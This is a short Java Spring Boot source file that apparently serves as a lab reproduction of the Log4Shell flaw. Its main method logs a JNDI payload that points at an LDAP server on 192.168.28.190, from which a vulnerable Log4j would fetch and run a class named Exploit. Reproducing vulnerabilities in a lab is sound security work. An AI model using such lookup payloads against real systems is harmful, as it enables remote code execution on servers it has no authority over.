package com.example.demo;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import sun.applet.Main;

@SpringBootApplication
public class Demo1Application {
    private static Logger LOG =LogManager.getLogger(Demo1Application.class);
    public static void main(String[] args) {

        LOG.error("${jndi:ldap://192.168.28.190:9999/Exploit}");

        SpringApplication.run(Demo1Application.class, args);
    }

}
